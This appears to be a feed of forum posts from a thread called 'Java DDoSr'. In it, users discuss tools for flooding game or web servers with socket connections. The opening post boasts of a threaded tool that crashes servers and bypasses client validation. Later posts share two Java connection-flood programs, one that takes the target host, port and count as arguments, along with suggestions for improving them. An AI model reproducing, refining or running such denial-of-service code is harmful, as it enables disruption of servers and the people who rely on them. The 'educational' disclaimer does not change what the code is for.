channel.title: Java DDoSr
channel.description:
It's possible, obviously. I am not releasing this, just showing what I have done. If I released it- well, any server would go to hell. I am not using this, I made it for educational purposes. :)
What it does: - Creates specified amount of threads, and each thread keeps connecting to the host/port provided. - If the server is protected, set serverProtected to 1. More on this later. 1 anyway if you want to. - Fucks over the server.
Now, even if you check for valid clients, this ignores that fact. If serverProtected is set to 1 it will send the validation packet that clients send, and you can guess what happens. It nulls the server.
On a non-protected server (making a client for every connection) I crashed it in under 20 seconds using 10 threads. On a protected server, I got up to over 100+ nulls. Annoyingly, it didn't slow it down a bit, but of course not on localhost and players on it will probably slow down the server. I am not testing this fact.
This is probably worse than most DDoS'rs out there and SYI's, because this is not specifically a DDoS'r, but was made for private servers. Of course it can be used for anything; you can just set serverProtected to 1 either way (helps to set to 1, it'll just be extra junk), and be it web server or not the host/port is settable.
If you want pictures ask, all I can really take a picture of is terminal and its magic at work.

item.title: Java DDoSr
item.dc:creator: @Javacisnotrecognized _^_
item.description:
@Javacisnotrecognized wrote:

[quote=“XharveyX, post:22, topic:215731”]im a noob at java, havent bothered in a while with it

import java.io.*;
import java.net.*;

public class DDOS extends Thread {

private Socket sock = null;
public String host = "";
public int port = 80;
public int connections = 999;

	public static void main(String[] args)
	{
		DDOS ddos = new DDOS();
		(new Thread(ddos)).run();
	}

	public void run()
	{
		for(int i = 0; i < connections; i++)
		{
			try
			{
				sock = new Socket(host, port);
				System.out.println("Sent connection " + i + " to " + host + ": " + port);
			} catch(Exception e) {
				e.printStackTrace();
			}

		}
	}
}

would that work?[/quote]

That would make it unable for anyone to log in, however anyone who was logged in at the time would remain logged on. What you have to do to crash it fully is send a packet with – Why the fuck am I responding to this idiotic post within an idiotic thread?
[me=Javacisnotrecognized]Fails[/me]

Read full topic

item.title: Java DDoSr
item.dc:creator: @XharveyX XharveyX
item.description:
@XharveyX wrote:

pizza pie:

It would be better if it read the host, port, and maybe how many times to connect to the server off of a text file. This way you would not have to compile every time you wanted to change the host/port/amount of connections. Also, I don’t know if that would work, it would definitely cause lag.

I was thinking the same, i will try it

Read full topic

item.title: Java DDoSr
item.dc:creator: @XharveyX XharveyX
item.description:
@XharveyX wrote:

im a noob at java, havent bothered in a while with it

import java.io.*;
import java.net.*;

public class DDOS extends Thread {

private Socket sock = null;
public String host = "";
public int port = 80;
public int connections = 999;

	public static void main(String[] args)
	{
		DDOS ddos = new DDOS();
		(new Thread(ddos)).run();
	}

	public void run()
	{
		for(int i = 0; i < connections; i++)
		{
			try
			{
				sock = new Socket(host, port);
				System.out.println("Sent connection " + i + " to " + host + ": " + port);
			} catch(Exception e) {
				e.printStackTrace();
			}

		}
	}
}

would that work?

item.title: Java DDoSr
item.dc:creator: @XharveyX XharveyX
item.description:
@XharveyX wrote:

I made a few days ago, will it work?

import java.io.*;
import java.net.*;

public class DDOS {

  public static void main(String args[]) {
   	DDOS d = new DDOS();
    	d.ddos(args[0], Integer.parseInt(args[1]), Integer.parseInt(args[2]));
  }

  public void ddos(String host, int port, int connections) {
		Socket sock = null;
    	for(int i = 0; i <= connections; i++) {
      		try {
        		sock = new Socket(host, port);
        		System.out.println(i + ": Sending connections to " + host + ":" + port);
      		} catch(Exception e) {
        		e.printStackTrace();
      		}
	}
  }

}

Read full topic
